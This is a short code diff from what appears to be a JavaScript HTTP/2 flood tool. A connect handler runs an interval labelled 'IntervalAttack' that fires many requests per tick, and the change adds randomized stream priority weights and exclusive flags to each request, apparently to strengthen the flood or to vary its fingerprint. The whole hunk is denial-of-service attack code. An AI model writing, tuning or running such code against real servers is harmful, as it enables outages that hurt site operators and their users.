@@ -273,8 +273,13 @@ let bexnxx = {
          client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
                 for (let i = 0; i < args.Rate; i++) {
-                    const request = client.request(bexnxx)
-	            .on('response', response => {
+                    const request = client.request(bexnxx);
+					request.priority({
+						weight: Math.random() < 0.5 ? 255 : 220,
+						depends_on: 0,
+						exclusive: true
+					});
+					request.on('response', response => {
                         request.close();
                         request.destroy();
                         return
